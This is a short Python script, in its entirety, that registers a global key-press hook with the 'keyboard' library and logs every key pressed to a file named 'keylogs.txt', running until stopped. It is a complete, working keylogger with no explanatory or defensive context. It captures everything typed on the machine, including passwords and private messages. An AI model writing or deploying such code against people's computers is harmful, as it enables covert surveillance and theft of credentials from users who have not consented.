import keyboard
file = 'keylogs.txt'
def key_press(event):
    with open(file, 'a') as f:
        f.write('{}\n'.format(event.name))
keyboard.on_press(key_press)
keyboard.wait()